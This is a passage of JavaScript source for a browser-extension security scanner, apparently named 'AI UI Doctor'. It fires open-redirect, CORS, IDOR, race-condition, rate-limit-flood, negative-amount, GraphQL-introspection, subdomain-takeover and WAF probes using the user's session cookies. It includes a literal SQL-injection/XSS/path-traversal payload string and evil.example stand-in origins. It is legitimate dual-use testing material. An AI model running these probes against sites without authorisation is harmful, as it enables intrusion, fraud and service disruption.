        `${n + 1}. [${f.status}]  payload: ${f.payload}\n    ${f.snippet.replace(/\s+/g, ' ').slice(0, 280)}`
      ).join('\n');
      securityFindings.push({ type: `fuzz-${category}`, summary, raw: findings });
    }
    return `${category}: ${payloads.length} payloads sent, ${findings.length} suspicious response(s)`;
  },

  session_audit: async () => {
    const { url } = await getActiveTab();
    if (!url) return 'no active tab url';
    let origin; try { origin = new URL(url).origin; } catch { return 'bad url'; }
    let cookies = [];
    try { cookies = await chrome.cookies.getAll({ url: origin }); } catch (e) { return 'cookies api error: ' + e.message; }
    const issues = [];
    const summarized = cookies.map((c) => {
      const flags = [];
      if (!c.secure) flags.push('NOT-Secure');
      if (!c.httpOnly) flags.push('NOT-HttpOnly');
      if (!c.sameSite || c.sameSite === 'no_restriction' || c.sameSite === 'unspecified') flags.push('SameSite-missing/none');
      if (flags.length) issues.push(`${c.name}: ${flags.join(', ')}`);
      return { name: c.name, valuePreview: (c.value || '').slice(0, 40), httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite };
    });
    let replay = 'skipped';
    try {
      const r = await bg({ type: 'RUN_FETCH', params: { url, method: 'GET', credentials: 'include' } });
      replay = `${r.status} (${r.fullLength}b)`;
    } catch (e) { replay = 'replay failed: ' + e.message; }
    const summary = `Cookies on ${origin}: ${cookies.length}\nWeak-flag cookies (replay risk):\n${issues.join('\n') || '  (none)'}\nReplay GET ${url} -> ${replay}`;
    securityFindings.push({ type: 'session-audit', summary, raw: { cookies: summarized, issues } });
    return `${cookies.length} cookies, ${issues.length} with weak flags`;
  },

  logic_flaw_test: async (params = {}) => {
    const url = params.url;
    if (!url) return 'no url provided';
    const method = (params.method || 'POST').toUpperCase();
    const tpl = params.bodyTemplate || params.body || '{"amount":{{amount}}}';
    const variants = ['0', '-1', '-100', '0.001', '0.00000001', '1e-10', '"0"', 'null', '99999999999', '-0.5'];
    const findings = [];
    for (const v of variants) {
      try {
        const body = tpl.replace(/{{amount}}/g, v);
        const r = await bg({ type: 'RUN_FETCH', params: {
          url, method, body, headers: { 'Content-Type': 'application/json' }, credentials: 'include',
        } });
        const accepted = r.status >= 200 && r.status < 300;
        findings.push({ variant: v, status: r.status, accepted, snippet: (r.body || '').slice(0, 150) });
      } catch (e) {
        findings.push({ variant: v, status: 'err', accepted: false, snippet: e.message });
      }
      await new Promise((res) => setTimeout(res, 100));
    }
    const accepted = findings.filter((f) => f.accepted);
    const summary = findings.map((f) => `${f.accepted ? 'ACCEPTED' : 'rejected'}: amount=${f.variant} -> ${f.status}\n  ${f.snippet.replace(/\s+/g, ' ').slice(0, 120)}`).join('\n');
    if (accepted.length) {
      securityFindings.push({ type: 'logic-flaw', summary, raw: findings });
    }
    return `${variants.length} amount variants tested, ${accepted.length} accepted (potential bypass)`;
  },

  cors_test: async (params = {}) => {
    const url = params.url || activeTabUrl;
    if (!url) return 'no url';
    const evilOrigin = 'https://evil.example';
    let r;
    try {
      r = await bg({ type: 'RUN_FETCH', params: {
        url, method: 'GET', headers: { 'Origin': evilOrigin }, credentials: 'omit',
      } });
    } catch (e) { return 'fetch error: ' + e.message; }
    const h = r.headers || {};
    const acao = h['access-control-allow-origin'];
    const acac = h['access-control-allow-credentials'];
    const issues = [];
    if (acao === '*' && acac === 'true') issues.push('CRITICAL: ACAO=* with ACAC=true (browsers reject but some clients accept)');
    if (acao === evilOrigin) issues.push('CRITICAL: Server reflects arbitrary Origin header');
    if (acao === 'null') issues.push('HIGH: Allows null origin (sandboxed iframe / file://)');
    if (acao && acao !== '*' && acao !== evilOrigin && /\.\*|\.[a-z]+\.\w+$/i.test(acao) === false && acac === 'true') {
      issues.push('REVIEW: ACAO restricted, but with credentials — confirm allowlist is exact');
    }
    const summary = `URL: ${url}\nSent Origin: ${evilOrigin}\nACAO: ${acao || '(none)'}\nACAC: ${acac || '(none)'}\nIssues: ${issues.join(' | ') || 'none'}`;
    if (issues.length) securityFindings.push({ type: 'cors', summary, raw: h });
    return issues.length ? `CORS issues: ${issues.length}` : 'CORS looks ok';
  },

  rate_limit_test: async (params = {}) => {
    const url = params.url || activeTabUrl;
    if (!url) return 'no url';
    const count = Math.min(Math.max(parseInt(params.count || 50, 10) || 50, 5), 1000);
    const method = (params.method || 'GET').toUpperCase();
    const body = params.body;
    const statuses = {};
    const t0 = Date.now();
    let firstBlock = -1;
    for (let i = 0; i < count; i++) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: {
          url, method, body: method === 'GET' ? undefined : body,
          headers: { 'Content-Type': 'application/json' }, credentials: 'include',
        } });
        statuses[r.status] = (statuses[r.status] || 0) + 1;
        if ((r.status === 429 || r.status === 403 || r.status === 503) && firstBlock < 0) firstBlock = i + 1;
      } catch { statuses['err'] = (statuses['err'] || 0) + 1; }
    }
    const dt = Date.now() - t0;
    const summary = `URL: ${url}\nSent ${count} ${method} requests in ${dt}ms\nStatus distribution: ${JSON.stringify(statuses)}\nFirst rate-limit response: ${firstBlock > 0 ? '#' + firstBlock : 'NEVER (no protection)'}`;
    if (firstBlock < 0) securityFindings.push({ type: 'rate-limit', summary, raw: statuses });
    return firstBlock > 0 ? `rate-limited at request #${firstBlock}` : `NO rate limit detected (${count} requests all passed)`;
  },

  open_redirect_test: async (params = {}) => {
    const baseUrl = params.url || activeTabUrl;
    if (!baseUrl) return 'no url';
    const evil = 'https://evil.example/x';
    const paramNames = ['next', 'url', 'redirect', 'redirect_uri', 'redirectUrl', 'return', 'returnUrl', 'returnTo', 'goto', 'continue', 'r', 'u', 'callback', 'destination', 'target', 'link', 'location', 'forward', 'to', 'page', 'ref', 'redir', 'path', 'out', 'jump', 'next_url', 'successUrl', 'successRedirect', 'failureRedirect', 'cancel', 'cancel_url', 'return_path', 'redirect_to', 'redirectTo', 'uri', 'exit', 'checkout_url', 'back', 'backUrl', 'logoutUrl', 'logout_url', 'continue_url', 'after_login', 'postLoginRedirect', 'service', 'from', 'fromUrl', 'origin', 'go'];
    const findings = [];
    for (const name of paramNames) {
      try {
        const u = new URL(baseUrl);
        u.searchParams.set(name, evil);
        const r = await bg({ type: 'RUN_FETCH', params: {
          url: u.toString(), method: 'GET', credentials: 'include',
        } });
        const loc = (r.headers || {})['location'] || '';
        const bodyHasEvil = (r.body || '').includes(evil);
        if (loc.includes(evil) || (r.status >= 300 && r.status < 400 && loc.startsWith('http') && !loc.startsWith(new URL(baseUrl).origin))) {
          findings.push({ param: name, status: r.status, location: loc, kind: 'redirect' });
        } else if (bodyHasEvil) {
          findings.push({ param: name, status: r.status, location: '(in body)', kind: 'reflected' });
        }
      } catch {}
      await new Promise((res) => setTimeout(res, 80));
    }
    if (findings.length) {
      const summary = findings.map((f) => `${f.kind === 'redirect' ? 'OPEN-REDIRECT' : 'reflected'}: ?${f.param}=${evil} -> ${f.status} ${f.location}`).join('\n');
      securityFindings.push({ type: 'open-redirect', summary, raw: findings });
    }
    return `tested ${paramNames.length} param names, ${findings.length} hit(s)`;
  },

  js_secret_scan: async (params = {}) => {
    const { id, url } = await getActiveTab();
    if (!isSafeWebUrl(url)) return 'Cannot scan — navigate to an http/https website first.';
    const origin = params.origin || (url ? new URL(url).origin : '');
    if (!origin) return 'no origin';
    const [{ result: scripts }] = await chrome.scripting.executeScript({
      target: { tabId: id },
      func: () => Array.from(document.scripts).map((s) => s.src).filter(Boolean),
    });
    const inlineRes = await chrome.scripting.executeScript({
      target: { tabId: id },
      func: () => Array.from(document.scripts).filter((s) => !s.src).map((s) => s.textContent || '').join('\n\n').slice(0, 200000),
    });
    const inlineCode = inlineRes[0]?.result || '';
    const targets = Array.from(new Set(scripts)).slice(0, params.maxFiles || 30);
    const findings = [];
    const scanText = (source, text) => {
      for (const sig of SECRET_REGEXES) {
        let m;
        const re = new RegExp(sig.re.source, sig.re.flags);
        let count = 0;
        while ((m = re.exec(text)) && count < 5) {
          const ctx = text.slice(Math.max(0, m.index - 40), m.index + m[0].length + 40);
          if (sig.validator && !sig.validator(m[0], ctx)) continue;
          findings.push({ source, type: sig.name, match: m[0].length > 80 ? m[0].slice(0, 80) + '…' : m[0], context: ctx });
          count++;
        }
      }
    };
    scanText('inline-script', inlineCode);
    let scanned = 1;
    for (const src of targets) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: src, method: 'GET', credentials: 'omit' } });
        if (r.body) scanText(src.split('/').pop().slice(0, 60), r.body);
        scanned++;
      } catch {}
      await new Promise((res) => setTimeout(res, 60));
    }
    const summary = findings.length
      ? `Scanned ${scanned} script source(s). Found ${findings.length} possible secret(s):\n` +
        findings.slice(0, 30).map((f, n) => `${n + 1}. [${f.type}] in ${f.source}\n     ${f.match}`).join('\n')
      : `Scanned ${scanned} script source(s). No secrets matched.`;
    if (findings.length) securityFindings.push({ type: 'js-secrets', summary, raw: findings });
    return findings.length ? `${findings.length} secret(s) detected` : 'no secrets in JS';
  },

  tech_fingerprint: async (params = {}) => {
    const url = params.url || activeTabUrl;
    if (!url) return 'no url';
    const r = await bg({ type: 'RUN_FETCH', params: { url, method: 'GET', credentials: 'include' } });
    const headers = r.headers || {};
    const body = r.body || '';
    const detected = [];
    for (const sig of TECH_SIGNATURES) {
      try { if (sig.test(headers, body)) detected.push(sig.name); } catch {}
    }
    const interesting = ['server', 'x-powered-by', 'x-aspnet-version', 'x-generator', 'x-runtime', 'x-drupal-cache', 'x-pingback', 'via'];
    const headerInfo = interesting.filter((k) => headers[k]).map((k) => `${k}: ${headers[k]}`);
    const summary = `URL: ${url}\nDetected: ${detected.join(', ') || 'none'}\nKey headers:\n  ${headerInfo.join('\n  ') || '(none)'}`;
    if (detected.length || headerInfo.length) securityFindings.push({ type: 'tech-fingerprint', summary, raw: { detected, headers } });
    return detected.length ? `${detected.length} tech detected: ${detected.slice(0, 4).join(', ')}` : 'no obvious fingerprint';
  },

  graphql_introspect: async (params = {}) => {
    const base = params.base || (activeTabUrl ? new URL(activeTabUrl).origin : '');
    if (!base) return 'no base';
    const paths = params.paths || ['/graphql', '/api/graphql', '/v1/graphql', '/query', '/graphiql', '/v2/graphql', '/v3/graphql', '/gql', '/graphql/v1', '/graphql/v2', '/api/v1/graphql', '/api/v2/graphql', '/api/v3/graphql', '/api/query', '/api/gql', '/graphql/console', '/graphql/playground', '/playground', '/console', '/graphql/explorer', '/explorer', '/graph', '/api/graph', '/public/graphql', '/private/graphql', '/internal/graphql'];
    const introspection = '{"query":"{__schema{queryType{name} mutationType{name} types{name kind fields{name}}}}"}';
    const findings = [];
    for (const p of paths) {
      const u = base + p;
      try {
        const r = await bg({ type: 'RUN_FETCH', params: {
          url: u, method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: introspection, credentials: 'include',
        } });
        if (r.body && /__schema|queryType|"types"\s*:/i.test(r.body)) {
          const typeCount = (r.body.match(/"name":/g) || []).length;
          findings.push({ url: u, status: r.status, exposed: true, typeCount });
        } else if (r.status === 200 && /graphql|query|mutation/i.test(r.body || '')) {
          findings.push({ url: u, status: r.status, exposed: 'partial' });
        }
      } catch {}
      await new Promise((res) => setTimeout(res, 100));
    }
    if (findings.length) {
      const summary = findings.map((f) => `${f.url} -> ${f.status} ${f.exposed === true ? 'INTROSPECTION OPEN (' + f.typeCount + ' name fields)' : 'looks like GraphQL'}`).join('\n');
      securityFindings.push({ type: 'graphql', summary, raw: findings });
    }
    return findings.length ? `GraphQL exposed at ${findings.length} path(s)` : 'no GraphQL introspection found';
  },

  dom_xss_scan: async () => {
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: () => {
        const sinks = [
          { name: 'innerHTML', re: /\.innerHTML\s*=/g },
          { name: 'outerHTML', re: /\.outerHTML\s*=/g },
          { name: 'document.write', re: /document\.write(?:ln)?\s*\(/g },
          { name: 'eval', re: /(?<![A-Za-z0-9_$])eval\s*\(/g },
          { name: 'Function()', re: /new\s+Function\s*\(/g },
          { name: 'setTimeout(string)', re: /setTimeout\s*\(\s*["'`]/g },
          { name: 'setInterval(string)', re: /setInterval\s*\(\s*["'`]/g },
          { name: 'insertAdjacentHTML', re: /\.insertAdjacentHTML\s*\(/g },
          { name: 'location.href=', re: /location\.(?:href|assign|replace)\s*=/g },
          { name: 'srcdoc=', re: /\.srcdoc\s*=/g },
        ];
        const sources = [
          { name: 'location.hash', re: /location\.hash/g },
          { name: 'location.search', re: /location\.search/g },
          { name: 'document.URL', re: /document\.URL/g },
          { name: 'document.referrer', re: /document\.referrer/g },
          { name: 'window.name', re: /window\.name/g },
          { name: 'postMessage data', re: /\.data\b.*postMessage|addEventListener\s*\(\s*["']message["']/g },
        ];
        const out = { sinkHits: {}, sourceHits: {}, scriptsScanned: 0 };
        for (const s of document.scripts) {
          const code = s.textContent || '';
          if (!code) continue;
          out.scriptsScanned++;
          for (const k of sinks) {
            const c = (code.match(k.re) || []).length;
            if (c) out.sinkHits[k.name] = (out.sinkHits[k.name] || 0) + c;
          }
          for (const k of sources) {
            const c = (code.match(k.re) || []).length;
            if (c) out.sourceHits[k.name] = (out.sourceHits[k.name] || 0) + c;
          }
        }
        return out;
      },
    });
    const sinkLines = Object.entries(result.sinkHits).map(([k, v]) => `  ${v}× ${k}`).join('\n') || '  (none)';
    const srcLines = Object.entries(result.sourceHits).map(([k, v]) => `  ${v}× ${k}`).join('\n') || '  (none)';
    const summary = `Scanned ${result.scriptsScanned} inline script(s).\nDangerous sinks:\n${sinkLines}\nUser-controlled sources:\n${srcLines}`;
    const totalSinks = Object.values(result.sinkHits).reduce((a, b) => a + b, 0);
    if (totalSinks) securityFindings.push({ type: 'dom-xss', summary, raw: result });
    return totalSinks ? `${totalSinks} sink hit(s) — review manually` : 'no dangerous sinks found';
  },

  csrf_check: async () => {
    const { id } = await getActiveTab();
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: () => {
        const tokenNames = /csrf|xsrf|_token|authenticity_token|nonce|anti.?forgery/i;
        const out = [];
        for (const f of document.forms) {
          if (!/post|put|patch|delete/i.test(f.method || 'get') && f.method) continue;
          const action = f.action || location.href;
          const inputs = Array.from(f.elements).filter((e) => e.name);
          const hasToken = inputs.some((e) => tokenNames.test(e.name));
          out.push({ action, method: (f.method || 'GET').toUpperCase(), inputCount: inputs.length, hasToken });
        }
        const cookies = document.cookie || '';
        const sameSiteHint = /; *SameSite=/i.test(cookies);
        return { forms: out, sameSiteCookieHint: sameSiteHint };
      },
    });
    const missing = result.forms.filter((f) => !f.hasToken && f.method !== 'GET');
    const summary = `Forms checked: ${result.forms.length}\nMissing CSRF token: ${missing.length}\n` +
      missing.slice(0, 12).map((f) => `  ${f.method} ${f.action}`).join('\n');
    if (missing.length) securityFindings.push({ type: 'csrf', summary, raw: result });
    return missing.length ? `${missing.length} form(s) without CSRF token` : 'CSRF tokens look present';
  },

  mixed_content_audit: async () => {
    const { id, url } = await getActiveTab();
    if (!url || !url.startsWith('https://')) return 'page not HTTPS — skipping';
    const [{ result }] = await chrome.scripting.executeScript({
      target: { tabId: id }, world: 'MAIN',
      func: () => {
        const out = { http: [], noSri: [] };
        const collect = (el, attr) => {
          const u = el[attr];
          if (!u) return;
          if (u.startsWith('http://')) out.http.push({ tag: el.tagName, url: u });
        };
        document.querySelectorAll('script[src]').forEach((s) => {
          collect(s, 'src');
          if (s.src && !s.integrity && new URL(s.src, location.href).origin !== location.origin) {
            out.noSri.push({ tag: 'SCRIPT', url: s.src });
          }
        });
        document.querySelectorAll('link[rel=stylesheet][href]').forEach((s) => {
          collect(s, 'href');
          if (s.href && !s.integrity && new URL(s.href, location.href).origin !== location.origin) {
            out.noSri.push({ tag: 'LINK', url: s.href });
          }
        });
        document.querySelectorAll('img[src], iframe[src], audio[src], video[src], source[src]').forEach((s) => collect(s, 'src'));
        return out;
      },
    });
    const summary = `HTTP resources on HTTPS page: ${result.http.length}\nThird-party scripts/styles WITHOUT SRI: ${result.noSri.length}\n` +
      (result.http.length ? 'Mixed content:\n' + result.http.slice(0, 10).map((r) => `  ${r.tag} ${r.url}`).join('\n') + '\n' : '') +
      (result.noSri.length ? 'Missing SRI:\n' + result.noSri.slice(0, 10).map((r) => `  ${r.tag} ${r.url}`).join('\n') : '');
    if (result.http.length || result.noSri.length) securityFindings.push({ type: 'mixed-content', summary, raw: result });
    return `${result.http.length} mixed, ${result.noSri.length} no-SRI`;
  },

  idor_test: async (params = {}) => {
    const baseUrl = params.url || activeTabUrl;
    if (!baseUrl) return 'no url';
    const u = new URL(baseUrl);
    const numericMatch = u.pathname.match(/\/(\d+)(?:\/|$)/);
    let target = null;
    let injectInPath = false;
    if (numericMatch) { target = parseInt(numericMatch[1], 10); injectInPath = true; }
    else {
      for (const [k, v] of u.searchParams) { if (/^\d+$/.test(v)) { target = parseInt(v, 10); params._param = k; break; } }
    }
    if (target === null) return 'no numeric ID found in URL';
    const tries = [];
    for (let delta = -2; delta <= 2; delta++) { if (delta) tries.push(target + delta); }
    tries.push(1, target * 2);
    const baseRes = await bg({ type: 'RUN_FETCH', params: { url: baseUrl, method: 'GET', credentials: 'include' } });
    const baseLen = (baseRes.body || '').length;
    const findings = [];
    for (const t of tries) {
      const u2 = new URL(baseUrl);
      if (injectInPath) u2.pathname = u2.pathname.replace(/\/(\d+)(\/|$)/, `/${t}$2`);
      else u2.searchParams.set(params._param, String(t));
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: u2.toString(), method: 'GET', credentials: 'include' } });
        const len = (r.body || '').length;
        const looksOk = r.status >= 200 && r.status < 300 && len > 100;
        findings.push({ id: t, status: r.status, len, suspect: looksOk && Math.abs(len - baseLen) > 20 });
      } catch {}
      await new Promise((res) => setTimeout(res, 80));
    }
    const suspects = findings.filter((f) => f.suspect);
    const summary = `Base URL: ${baseUrl} (orig id=${target}, len=${baseLen})\n` +
      findings.map((f) => `  id=${f.id} -> ${f.status} len=${f.len}${f.suspect ? ' ⚠ POSSIBLE IDOR' : ''}`).join('\n');
    if (suspects.length) securityFindings.push({ type: 'idor', summary, raw: findings });
    return suspects.length ? `${suspects.length} suspicious id(s) returned data` : 'no IDOR signal';
  },

  race_condition_test: async (params = {}) => {
    const url = params.url || activeTabUrl;
    if (!url) return 'no url';
    const count = Math.min(Math.max(parseInt(params.count || 50, 10) || 50, 2), 500);
    const method = (params.method || 'POST').toUpperCase();
    const body = params.body || '';
    const reqs = [];
    for (let i = 0; i < count; i++) {
      reqs.push(bg({ type: 'RUN_FETCH', params: {
        url, method, headers: { 'Content-Type': 'application/json' },
        body: method === 'GET' ? undefined : body, credentials: 'include',
      } }).catch(() => ({ status: 'err' })));
    }
    const t0 = performance.now();
    const results = await Promise.all(reqs);
    const dt = Math.round(performance.now() - t0);
    const statuses = {};
    results.forEach((r) => { statuses[r.status] = (statuses[r.status] || 0) + 1; });
    const successes = results.filter((r) => typeof r.status === 'number' && r.status >= 200 && r.status < 300).length;
    const summary = `URL: ${url}\nFired ${count} parallel ${method} in ${dt}ms\nStatuses: ${JSON.stringify(statuses)}\nSuccesses: ${successes}\n→ If a single-use action (claim, redeem, withdraw) succeeded multiple times, race condition is real.`;
    if (successes >= 2) securityFindings.push({ type: 'race', summary, raw: { statuses, successes } });
    return `${successes}/${count} parallel requests succeeded`;
  },

  auth_crawler: async (params = {}) => {
    const { id } = await getActiveTab();
    const startUrl = params.url || activeTabUrl;
    if (!startUrl) return 'no url';
    const origin = new URL(startUrl).origin;
    const maxPages = Math.min(Math.max(parseInt(params.maxPages || 20, 10) || 20, 2), 60);
    const visited = new Set();
    const queue = [startUrl];
    const collected = [];
    while (queue.length && visited.size < maxPages) {
      const current = queue.shift();
      if (visited.has(current)) continue;
      visited.add(current);
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: current, method: 'GET', credentials: 'include' } });
        const body = r.body || '';
        collected.push({ url: current, status: r.status, len: body.length });
        const linkRe = /href\s*=\s*["']([^"'#]+)["']/gi;
        let m;
        let added = 0;
        while ((m = linkRe.exec(body)) && added < 8) {
          try {
            const next = new URL(m[1], current).toString().split('#')[0];
            if (next.startsWith(origin) && !visited.has(next) && !queue.includes(next)) {
              queue.push(next); added++;
            }
          } catch {}
        }
      } catch {}
      await new Promise((res) => setTimeout(res, 120));
    }
    const interesting = collected.filter((p) => p.status >= 200 && p.status < 400 && /admin|dashboard|account|profile|settings|user|api|debug|config/i.test(p.url));
    const summary = `Crawled ${collected.length} same-origin page(s) with current session.\nInteresting reachable URLs: ${interesting.length}\n` +
      interesting.slice(0, 15).map((p) => `  ${p.status} ${p.url}`).join('\n');
    if (interesting.length) securityFindings.push({ type: 'auth-crawl', summary, raw: collected });
    return `crawled ${collected.length}, ${interesting.length} sensitive`;
  },

  report_html: async () => {
    if (!securityFindings.length) return 'no findings to export';
    const esc = (s) => String(s == null ? '' : s).replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));
    const rows = securityFindings.map((f, n) => `
      <section class="finding">
        <h2>${n + 1}. ${esc(f.type)}</h2>
        <pre>${esc(f.summary)}</pre>
      </section>`).join('');
    const html = `<!doctype html><html><head><meta charset="utf-8"><title>Security Audit Report — ${esc(activeTabUrl || 'site')}</title>
<style>
  body { font-family: system-ui, -apple-system, sans-serif; background: #0b1220; color: #e2e8f0; max-width: 900px; margin: 24px auto; padding: 0 16px; }
  h1 { color: #38bdf8; }
  .meta { color: #94a3b8; font-size: 13px; margin-bottom: 24px; }
  .finding { background: #111c2f; border-left: 4px solid #0ea5e9; padding: 12px 16px; margin: 12px 0; border-radius: 6px; }
  .finding h2 { margin: 0 0 8px; color: #f59e0b; font-size: 16px; text-transform: uppercase; letter-spacing: 0.5px; }
  pre { white-space: pre-wrap; word-break: break-word; font-size: 13px; line-height: 1.5; margin: 0; color: #cbd5e1; }
  .footer { margin-top: 32px; color: #64748b; font-size: 12px; text-align: center; }
</style></head><body>
<h1>AI UI Doctor — Security Audit Report</h1>
<div class="meta">Target: ${esc(activeTabUrl || 'unknown')}<br>Generated: ${new Date().toISOString()}<br>Findings: ${securityFindings.length}</div>
${rows}
<div class="footer">Generated by AI UI Doctor v5.0.0 — Made by E Devil</div>
</body></html>`;
    const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
    try {
      await bg({ type: 'DOWNLOAD', url: dataUrl, filename: `security-audit-${Date.now()}.html` });
      return `report exported (${securityFindings.length} findings)`;
    } catch (e) { return 'export failed: ' + e.message; }
  },

  subdomain_finder: async (params = {}) => {
    const host = params.domain || (activeTabUrl ? new URL(activeTabUrl).hostname : '');
    if (!host) return 'no domain';
    const parts = host.replace(/^www\./, '').split('.');
    const apex = parts.length > 2 ? parts.slice(-2).join('.') : parts.join('.');
    const found = new Set();
    try {
      const r = await bg({ type: 'RUN_FETCH', params: {
        url: `https://crt.sh/?q=%25.${encodeURIComponent(apex)}&output=json`,
        method: 'GET', credentials: 'omit',
      } });
      if (r.body) {
        const txt = r.body.trim();
        if (txt.startsWith('[')) {
          const data = JSON.parse(txt);
          for (const c of data) {
            String(c.name_value || '').split('\n').forEach((n) => {
              n = n.trim().toLowerCase().replace(/^\*\./, '');
              if (n && n.endsWith(apex) && !n.includes(' ')) found.add(n);
            });
          }
        }
      }
    } catch {}
    const prefixes = ['www', 'api', 'app', 'admin', 'dev', 'staging', 'test', 'beta', 'blog', 'shop', 'mail', 'smtp', 'ftp', 'vpn', 'dashboard', 'panel', 'portal', 'cdn', 'static', 'assets', 'img', 'm', 'mobile', 'old', 'new', 'demo', 'docs', 'support', 'status', 'wiki', 'git', 'jenkins', 'grafana', 'kibana', 'monitor', 'auth', 'login', 'sso', 'webhook', 'webhooks', 'callback', 'redirect', 'analytics', 'tracker', 'pay', 'payment', 'checkout', 'billing', 'invoice', 'cron', 'queue', 'worker', 'preview', 'sandbox', 'internal', 'corp', 'office', 's3', 'storage', 'api2', 'api3', 'api-v2', 'api-v3', 'v1', 'v2', 'v3', 'graphql', 'ws', 'wss', 'socket', 'media', 'upload', 'uploads', 'files', 'file', 'images', 'video', 'videos', 'stream', 'live', 'chat', 'connect', 'proxy', 'gateway', 'lb', 'edge', 'origin', 'backend', 'frontend', 'intranet', 'extranet', 'ops', 'devops', 'security', 'bug', 'bugs', 'issue', 'issues', 'jira', 'confluence', 'helpdesk', 'help', 'forum', 'community', 'news', 'press', 'media-kit', 'remote', 'access', 'vpn2', 'owa', 'autodiscover', 'exchange', 'sharepoint', 'adc', 'citrix', 'phpmyadmin', 'db', 'database', 'mysql', 'postgres', 'redis', 'elastic', 'elasticsearch', 'kibana2', 'logstash', 'vault', 'consul', 'etcd', 'rancher', 'k8s', 'kubernetes', 'docker', 'registry', 'artifactory', 'nexus', 'sonar', 'sonarqube', 'gitlab', 'bitbucket', 'svn', 'backup', 'backups', 'archive', 'data', 'report', 'reports', 'metrics', 'stats', 'prometheus', 'node', 'service', 'services', 'microservice', 'search', 'solr', 'kafka', 'rabbitmq', 'mq', 'smtp2', 'mail2', 'webmail', 'ns1', 'ns2', 'dns', 'mx', 'relay', 'bounce', 'campaign', 'crm', 'erp', 'hr', 'finance', 'legal', 'engineering', 'infra', 'infrastructure', 'prod', 'production', 'uat', 'qa', 'int', 'preprod', 'release'];
    for (const p of prefixes) {
      const sub = `${p}.${apex}`;
      if (found.has(sub)) continue;
      try {
        const r = await bg({ type: 'RUN_FETCH', params: {
          url: `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(sub)}&type=A`,
          method: 'GET', headers: { 'Accept': 'application/dns-json' }, credentials: 'omit',
        } });
        const dns = JSON.parse(r.body || '{}');
        if (dns.Answer && dns.Answer.length) found.add(sub);
      } catch {}
      await new Promise((res) => setTimeout(res, 40));
    }
    const list = Array.from(found).slice(0, 80);
    const probed = [];
    for (const sub of list) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: `https://${sub}/`, method: 'GET', credentials: 'omit' } });
        probed.push({ sub, status: r.status, server: (r.headers || {})['server'] || '', body: (r.body || '').slice(0, 600) });
      } catch (e) {
        probed.push({ sub, status: 'err', server: '', body: '' });
      }
      await new Promise((res) => setTimeout(res, 70));
    }
    const live = probed.filter((p) => typeof p.status === 'number');
    const summary = `Apex: ${apex}\nFound ${found.size} subdomain(s) (cert transparency + DNS lookup), probed ${probed.length}:\n` +
      probed.slice(0, 50).map((p) => `  ${String(p.status).padEnd(4)} ${p.sub}${p.server ? '  [' + p.server + ']' : ''}`).join('\n');
    if (found.size) securityFindings.push({ type: 'subdomains', summary, raw: probed });
    return `${found.size} subdomain(s), ${live.length} live`;
  },

  subdomain_takeover: async (params = {}) => {
    let subs = params.subdomains;
    if (!subs || !subs.length) {
      const last = [...securityFindings].reverse().find((f) => f.type === 'subdomains');
      if (last) subs = (last.raw || []).map((p) => p.sub);
    }
    if (!subs || !subs.length) return 'no subdomains — run subdomain_finder first';
    const fingerprints = [
      { service: 'GitHub Pages', re: /there isn't a github pages site here|404.*github\.io/i },
      { service: 'Heroku', re: /no such app|herokucdn|herokuapp/i },
      { service: 'AWS S3', re: /nosuchbucket|the specified bucket does not exist/i },
      { service: 'Vercel', re: /deployment[_ ]not[_ ]found|the deployment could not be found/i },
      { service: 'Netlify', re: /not found - request id/i },
      { service: 'Azure', re: /404 web site not found|azure web app/i },
      { service: 'Shopify', re: /sorry, this shop is currently unavailable/i },
      { service: 'Tumblr', re: /there's nothing here|whatever you were looking for doesn't currently exist/i },
      { service: 'Squarespace', re: /no such account/i },
      { service: 'Fastly', re: /fastly error: unknown domain/i },
      { service: 'Pantheon', re: /the gods are wise.*pantheon/i },
      { service: 'Surge.sh', re: /project not found/i },
      { service: 'Bitbucket', re: /repository not found/i },
      { service: 'Tilda', re: /please renew your subscription/i },
      { service: 'Webflow', re: /the page you are looking for doesn't exist or has been moved/i },
      { service: 'Cloudfront', re: /bad request.*we can't connect to the server/i },
    ];
    const found = [];
    for (const sub of subs.slice(0, 60)) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: `https://${sub}/`, method: 'GET', credentials: 'omit' } });
        const body = r.body || '';
        for (const fp of fingerprints) {
          if (fp.re.test(body)) { found.push({ sub, service: fp.service, status: r.status }); break; }
        }
      } catch {}
      await new Promise((res) => setTimeout(res, 80));
    }
    const summary = found.length
      ? `Checked ${Math.min(subs.length, 60)} subdomain(s).\n⚠ POSSIBLE TAKEOVERS:\n` + found.map((f) => `  ${f.sub} -> ${f.service} dangling (status ${f.status})`).join('\n')
      : `Checked ${Math.min(subs.length, 60)} subdomain(s). No dangling-service fingerprints matched.`;
    if (found.length) securityFindings.push({ type: 'subdomain-takeover', summary, raw: found });
    return found.length ? `${found.length} possible takeover(s)` : 'no takeover signal';
  },

  waf_detect: async (params = {}) => {
    const url = params.url || activeTabUrl;
    if (!url) return 'no url';
    const u = new URL(url);
    u.searchParams.set('___wafprobe', "1' OR '1'='1--<script>alert(1)</script>../../etc/passwd");
    const r = await bg({ type: 'RUN_FETCH', params: { url: u.toString(), method: 'GET', credentials: 'omit' } });
    const headers = r.headers || {};
    const cookies = headers['set-cookie'] || '';
    const body = (r.body || '').toLowerCase();
    const sigs = [
      { name: 'Cloudflare',           test: () => 'cf-ray' in headers || /cloudflare/i.test(body) || /cloudflare/i.test(headers['server'] || '') },
      { name: 'Cloudflare Bot Mgmt',  test: () => /cf_bm|__cf_bm/i.test(cookies) || 'cf-mitigated' in headers || 'cf-chl-bypass' in headers },
      { name: 'AWS WAF / CloudFront', test: () => 'x-amzn-requestid' in headers || 'x-amz-cf-id' in headers || /aws.*waf|request blocked|x-amzn-trace-id/i.test(body) },
      { name: 'Akamai',               test: () => /akamai|akamaighost/i.test(headers['server'] || '') || 'x-akamai-transformed' in headers || 'x-check-cacheable' in headers },
